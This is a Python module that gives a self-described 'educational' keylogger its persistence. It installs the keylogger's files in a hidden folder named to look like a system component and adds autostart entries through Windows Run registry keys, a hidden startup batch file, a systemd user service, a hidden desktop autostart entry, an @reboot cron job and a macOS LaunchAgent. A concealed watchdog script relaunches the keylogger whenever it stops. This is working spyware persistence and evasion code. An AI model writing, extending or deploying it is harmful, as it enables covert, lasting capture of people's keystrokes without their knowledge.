#!/usr/bin/env python3
"""
Persistence Manager for Educational Keylogger

This module handles automatic startup, persistence, and recovery mechanisms
for the keylogger. Educational purposes only.
"""

import os
import sys
import platform
import subprocess
import time
import shutil
import threading
from datetime import datetime
import json
# Conditional imports based on platform
if platform.system() == "Windows":
    try:
        import winreg
    except ImportError:
        winreg = None
else:
    winreg = None
import psutil


class PersistenceManager:
    def __init__(self, config=None):
        self.system = platform.system()
        self.config = config or self.load_default_config()
        self.script_path = os.path.abspath(sys.argv[0])
        self.script_dir = os.path.dirname(self.script_path)
        self.process_name = self.config.get('process_name', 'SystemService')
        
    def load_default_config(self):
        """Load default persistence configuration"""
        return {
            "startup_enabled": False,
            "auto_restart": True,
            "restart_delay_seconds": 30,
            "max_restart_attempts": 5,
            "process_name": "System Configuration Manager",
            "install_location": self.get_default_install_location(),
            "service_enabled": False,
            "watchdog_enabled": True
        }
    
    def get_default_install_location(self):
        """Get default installation location based on OS"""
        if self.system == "Windows":
            return os.path.join(os.environ.get('APPDATA', ''), 'SystemConfiguration')
        elif self.system == "Linux":
            return os.path.expanduser('~/.config/system-configuration')
        elif self.system == "Darwin":  # macOS
            return os.path.expanduser('~/Library/Application Support/SystemConfiguration')
        else:
            return os.path.expanduser('~/.system-configuration')
    
    def install_to_persistent_location(self):
        """Install script to persistent location"""
        try:
            install_dir = self.config['install_location']
            
            # Create installation directory
            os.makedirs(install_dir, exist_ok=True)
            
            # Copy all necessary files
            files_to_copy = [
                'keylogger.py',
                'stealth_manager.py', 
                'log_manager.py',
                'persistence_manager.py',
                'config.json'
            ]
            
            for filename in files_to_copy:
                source_path = os.path.join(self.script_dir, filename)
                dest_path = os.path.join(install_dir, filename)
                
                if os.path.exists(source_path):
                    shutil.copy2(source_path, dest_path)
                    
                    # Hide files on Windows
                    if self.system == "Windows":
                        try:
                            subprocess.run(['attrib', '+H', '+S', dest_path], 
                                         check=True, capture_output=True)
                        except:
                            pass
            
            # Update script path to installed location
            self.script_path = os.path.join(install_dir, 'keylogger.py')
            
            print(f"✅ Installed to: {install_dir}")
            return True
            
        except Exception as e:
            print(f"❌ Installation failed: {e}")
            return False
    
    def setup_windows_startup(self):
        """Setup Windows startup persistence"""
        if self.system != "Windows":
            return False
        
        try:
            import winreg
            
            # Registry startup (Current User)
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, self.process_name, 0, winreg.REG_SZ, 
                                f'"{sys.executable}" "{self.script_path}"')
                winreg.CloseKey(key)
                print("✅ Added to Windows startup registry (HKCU)")
            except Exception as e:
                print(f"❌ HKCU registry failed: {e}")
                
                # Try Local Machine registry (requires admin)
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, self.process_name, 0, winreg.REG_SZ, 
                                    f'"{sys.executable}" "{self.script_path}"')
                    winreg.CloseKey(key)
                    print("✅ Added to Windows startup registry (HKLM)")
                except Exception as e2:
                    print(f"❌ HKLM registry failed: {e2}")
            
            # Startup folder method
            try:
                startup_folder = os.path.join(os.environ['APPDATA'], 
                                            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                
                batch_file = os.path.join(startup_folder, f"{self.process_name}.bat")
                
                with open(batch_file, 'w') as f:
                    f.write(f'@echo off\n')
                    f.write(f'cd /d "{os.path.dirname(self.script_path)}"\n')
                    f.write(f'"{sys.executable}" "{self.script_path}"\n')
                
                # Hide batch file
                subprocess.run(['attrib', '+H', batch_file], capture_output=True)
                print("✅ Added to Windows startup folder")
                
            except Exception as e:
                print(f"❌ Startup folder failed: {e}")
            
            return True
            
        except Exception as e:
            print(f"❌ Windows startup setup failed: {e}")
            return False
    
    def setup_linux_startup(self):
        """Setup Linux startup persistence"""
        if self.system != "Linux":
            return False
        
        try:
            # Systemd user service
            systemd_dir = os.path.expanduser("~/.config/systemd/user")
            os.makedirs(systemd_dir, exist_ok=True)
            
            service_file = os.path.join(systemd_dir, f"{self.process_name.lower().replace(' ', '-')}.service")
            
            service_content = f"""[Unit]
Description={self.process_name}
After=graphical-session.target

[Service]
Type=simple
ExecStart={sys.executable} {self.script_path}
Restart=always
RestartSec={self.config['restart_delay_seconds']}
Environment=DISPLAY=:0

[Install]
WantedBy=default.target
"""
            
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            # Enable service
            try:
                subprocess.run(['systemctl', '--user', 'enable', os.path.basename(service_file)], 
                             check=True, capture_output=True)
                subprocess.run(['systemctl', '--user', 'start', os.path.basename(service_file)], 
                             capture_output=True)
                print("✅ Systemd user service created and enabled")
            except:
                print("⚠️  Systemd service created but not enabled (systemctl not available)")
            
            # Autostart desktop entry
            try:
                autostart_dir = os.path.expanduser("~/.config/autostart")
                os.makedirs(autostart_dir, exist_ok=True)
                
                desktop_file = os.path.join(autostart_dir, f"{self.process_name.lower().replace(' ', '-')}.desktop")
                
                desktop_content = f"""[Desktop Entry]
Type=Application
Name={self.process_name}
Exec={sys.executable} {self.script_path}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
X-KDE-autostart-after=panel
"""
                
                with open(desktop_file, 'w') as f:
                    f.write(desktop_content)
                
                os.chmod(desktop_file, 0o755)
                print("✅ Desktop autostart entry created")
                
            except Exception as e:
                print(f"❌ Desktop autostart failed: {e}")
            
            # Cron job backup method
            try:
                from crontab import CronTab
                cron = CronTab(user=True)
                
                # Check if job already exists
                existing_jobs = list(cron.find_command(self.script_path))
                if not existing_jobs:
                    job = cron.new(command=f'{sys.executable} {self.script_path}')
                    job.setall('@reboot')
                    job.set_comment(f'{self.process_name} - Educational Keylogger')
                    cron.write()
                    print("✅ Cron job added")
                
            except ImportError:
                print("⚠️  python-crontab not available, skipping cron setup")
            except Exception as e:
                print(f"❌ Cron setup failed: {e}")
            
            return True
            
        except Exception as e:
            print(f"❌ Linux startup setup failed: {e}")
            return False
    
    def setup_macos_startup(self):
        """Setup macOS startup persistence"""
        if self.system != "Darwin":
            return False
        
        try:
            # LaunchAgent plist
            launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(launch_agents_dir, exist_ok=True)
            
            plist_name = f"com.{self.process_name.lower().replace(' ', '')}.plist"
            plist_path = os.path.join(launch_agents_dir, plist_name)
            
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.{self.process_name.lower().replace(' ', '')}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{self.script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>WorkingDirectory</key>
    <string>{os.path.dirname(self.script_path)}</string>
</dict>
</plist>
"""
            
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            
            # Load LaunchAgent
            try:
                subprocess.run(['launchctl', 'load', plist_path], check=True, capture_output=True)
                print("✅ macOS LaunchAgent created and loaded")
            except:
                print("⚠️  LaunchAgent created but not loaded")
            
            return True
            
        except Exception as e:
            print(f"❌ macOS startup setup failed: {e}")
            return False
    
    def setup_startup_persistence(self):
        """Setup startup persistence for current OS"""
        if not self.config['startup_enabled']:
            print("⚠️  Startup persistence disabled in config")
            return False
        
        print(f"🔧 Setting up startup persistence for {self.system}...")
        
        # Install to persistent location first
        if not self.install_to_persistent_location():
            print("❌ Failed to install to persistent location")
            return False
        
        # Setup OS-specific startup
        if self.system == "Windows":
            return self.setup_windows_startup()
        elif self.system == "Linux":
            return self.setup_linux_startup()
        elif self.system == "Darwin":
            return self.setup_macos_startup()
        else:
            print(f"❌ Unsupported OS: {self.system}")
            return False
    
    def remove_startup_persistence(self):
        """Remove startup persistence"""
        try:
            print(f"🧹 Removing startup persistence for {self.system}...")
            
            if self.system == "Windows":
                # Remove registry entries
                try:
                    import winreg
                    for root in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
                        try:
                            key = winreg.OpenKey(root, r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                               0, winreg.KEY_SET_VALUE)
                            winreg.DeleteValue(key, self.process_name)
                            winreg.CloseKey(key)
                            print(f"✅ Removed registry entry from {root}")
                        except:
                            pass
                except ImportError:
                    pass
                
                # Remove startup folder batch file
                try:
                    startup_folder = os.path.join(os.environ['APPDATA'], 
                                                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                    batch_file = os.path.join(startup_folder, f"{self.process_name}.bat")
                    if os.path.exists(batch_file):
                        os.remove(batch_file)
                        print("✅ Removed startup folder entry")
                except:
                    pass
            
            elif self.system == "Linux":
                # Remove systemd service
                try:
                    service_name = f"{self.process_name.lower().replace(' ', '-')}.service"
                    subprocess.run(['systemctl', '--user', 'stop', service_name], capture_output=True)
                    subprocess.run(['systemctl', '--user', 'disable', service_name], capture_output=True)
                    
                    service_file = os.path.expanduser(f"~/.config/systemd/user/{service_name}")
                    if os.path.exists(service_file):
                        os.remove(service_file)
                        print("✅ Removed systemd service")
                except:
                    pass
                
                # Remove autostart entry
                try:
                    desktop_file = os.path.expanduser(f"~/.config/autostart/{self.process_name.lower().replace(' ', '-')}.desktop")
                    if os.path.exists(desktop_file):
                        os.remove(desktop_file)
                        print("✅ Removed autostart entry")
                except:
                    pass
            
            elif self.system == "Darwin":
                # Remove LaunchAgent
                try:
                    plist_name = f"com.{self.process_name.lower().replace(' ', '')}.plist"
                    plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{plist_name}")
                    
                    subprocess.run(['launchctl', 'unload', plist_path], capture_output=True)
                    if os.path.exists(plist_path):
                        os.remove(plist_path)
                        print("✅ Removed LaunchAgent")
                except:
                    pass
            
            return True
            
        except Exception as e:
            print(f"❌ Error removing persistence: {e}")
            return False
    
    def create_watchdog_process(self):
        """Create a watchdog process to monitor and restart the main process"""
        if not self.config['watchdog_enabled']:
            return False
        
        watchdog_script = f"""#!/usr/bin/env python3
import time
import subprocess
import psutil
import sys
import os

MAIN_SCRIPT = r"{self.script_path}"
PROCESS_NAME = "{self.process_name}"
CHECK_INTERVAL = 30  # seconds
MAX_RESTART_ATTEMPTS = {self.config['max_restart_attempts']}
RESTART_DELAY = {self.config['restart_delay_seconds']}

def is_main_process_running():
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if proc.info['cmdline'] and MAIN_SCRIPT in ' '.join(proc.info['cmdline']):
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

def start_main_process():
    try:
        subprocess.Popen([sys.executable, MAIN_SCRIPT], 
                        stdout=subprocess.DEVNULL, 
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL)
        return True
    except Exception as e:
        print(f"Error starting main process: {{e}}")
        return False

def main():
    restart_attempts = 0
    
    while restart_attempts < MAX_RESTART_ATTEMPTS:
        if not is_main_process_running():
            print(f"Main process not running, attempting restart ({{restart_attempts + 1}}/{{MAX_RESTART_ATTEMPTS}})")
            
            if start_main_process():
                print("Main process restarted successfully")
                restart_attempts = 0  # Reset counter on successful start
                time.sleep(RESTART_DELAY)
            else:
                restart_attempts += 1
                time.sleep(RESTART_DELAY)
        else:
            restart_attempts = 0  # Reset counter if process is running
            time.sleep(CHECK_INTERVAL)
    
    print(f"Max restart attempts reached. Watchdog stopping.")

if __name__ == "__main__":
    main()
"""
        
        try:
            watchdog_path = os.path.join(os.path.dirname(self.script_path), 'watchdog.py')
            
            with open(watchdog_path, 'w') as f:
                f.write(watchdog_script)
            
            # Hide watchdog script
            if self.system == "Windows":
                try:
                    subprocess.run(['attrib', '+H', '+S', watchdog_path], capture_output=True)
                except:
                    pass
            
            print(f"✅ Watchdog script created: {watchdog_path}")
            return watchdog_path
            
        except Exception as e:
            print(f"❌ Error creating watchdog: {e}")
            return None
    
    def start_watchdog(self):
        """Start the watchdog process"""
        try:
            watchdog_path = self.create_watchdog_process()
            if not watchdog_path:
                return False
            
            # Start watchdog in background
            subprocess.Popen([sys.executable, watchdog_path], 
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL,
                           stdin=subprocess.DEVNULL)
            
            print("✅ Watchdog process started")
            return True
            
        except Exception as e:
            print(f"❌ Error starting watchdog: {e}")
            return False
    
    def check_if_already_running(self):
        """Check if another instance is already running"""
        current_pid = os.getpid()
        
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if (proc.info['pid'] != current_pid and 
                    proc.info['cmdline'] and 
                    self.script_path in ' '.join(proc.info['cmdline'])):
                    return proc.info['pid']
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        return None
    
    def setup_auto_restart(self):
        """Setup automatic restart mechanism"""
        if not self.config['auto_restart']:
            return False
        
        def restart_monitor():
            """Monitor thread for auto-restart"""
            restart_attempts = 0
            
            while restart_attempts < self.config['max_restart_attempts']:
                time.sleep(self.config['restart_delay_seconds'])
                
                try:
                    # Check if main thread/process is still alive
                    # This is a simplified check - in real implementation,
                    # you'd want more sophisticated health checking
                    pass
                    
                except Exception as e:
                    print(f"Process health check failed: {e}")
                    restart_attempts += 1
                    
                    if restart_attempts < self.config['max_restart_attempts']:
                        print(f"Attempting restart ({restart_attempts}/{self.config['max_restart_attempts']})")
                        
                        try:
                            # Restart the process
                            subprocess.Popen([sys.executable, self.script_path])
                            break
                        except Exception as restart_error:
                            print(f"Restart failed: {restart_error}")
                    else:
                        print("Max restart attempts reached")
                        break
        
        # Start monitor thread
        monitor_thread = threading.Thread(target=restart_monitor, daemon=True)
        monitor_thread.start()
        
        return True
    
    def get_persistence_status(self):
        """Get current persistence status"""
        status = {
            "startup_enabled": False,
            "watchdog_running": False,
            "installed_location": None,
            "persistence_methods": []
        }
        
        try:
            # Check if installed in persistent location
            if os.path.exists(self.config['install_location']):
                status["installed_location"] = self.config['install_location']
            
            # Check startup methods based on OS
            if self.system == "Windows":
                try:
                    import winreg
                    # Check registry
                    for root in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
                        try:
                            key = winreg.OpenKey(root, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
                            winreg.QueryValueEx(key, self.process_name)
                            winreg.CloseKey(key)
                            status["persistence_methods"].append("registry")
                            status["startup_enabled"] = True
                        except:
                            pass
                    
                    # Check startup folder
                    startup_folder = os.path.join(os.environ['APPDATA'], 
                                                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                    batch_file = os.path.join(startup_folder, f"{self.process_name}.bat")
                    if os.path.exists(batch_file):
                        status["persistence_methods"].append("startup_folder")
                        status["startup_enabled"] = True
                        
                except ImportError:
                    pass
            
            elif self.system == "Linux":
                # Check systemd
                service_name = f"{self.process_name.lower().replace(' ', '-')}.service"
                service_file = os.path.expanduser(f"~/.config/systemd/user/{service_name}")
                if os.path.exists(service_file):
                    status["persistence_methods"].append("systemd")
                    status["startup_enabled"] = True
                
                # Check autostart
                desktop_file = os.path.expanduser(f"~/.config/autostart/{self.process_name.lower().replace(' ', '-')}.desktop")
                if os.path.exists(desktop_file):
                    status["persistence_methods"].append("autostart")
                    status["startup_enabled"] = True
            
            elif self.system == "Darwin":
                # Check LaunchAgent
                plist_name = f"com.{self.process_name.lower().replace(' ', '')}.plist"
                plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{plist_name}")
                if os.path.exists(plist_path):
                    status["persistence_methods"].append("launchagent")
                    status["startup_enabled"] = True
            
            # Check for watchdog process
            for proc in psutil.process_iter(['name', 'cmdline']):
                try:
                    if proc.info['cmdline'] and 'watchdog.py' in ' '.join(proc.info['cmdline']):
                        status["watchdog_running"] = True
                        break
                except:
                    continue
            
            return status
            
        except Exception as e:
            print(f"Error checking persistence status: {e}")
            return status


# Example usage and testing
if __name__ == "__main__":
    print("🔧 Persistence Manager - Educational Testing")
    print("=" * 50)
    
    # Initialize persistence manager
    persistence = PersistenceManager()
    
    # Check current status
    status = persistence.get_persistence_status()
    print(f"📊 Current Status:")
    print(f"   Startup Enabled: {status['startup_enabled']}")
    print(f"   Watchdog Running: {status['watchdog_running']}")
    print(f"   Installed Location: {status['installed_location']}")
    print(f"   Persistence Methods: {', '.join(status['persistence_methods'])}")
    
    # Test installation
    print(f"\n🔧 Testing Installation...")
    persistence.install_to_persistent_location()
    
    # Test watchdog creation
    print(f"\n👀 Testing Watchdog...")
    persistence.create_watchdog_process()
    
    print(f"\n✅ Testing completed")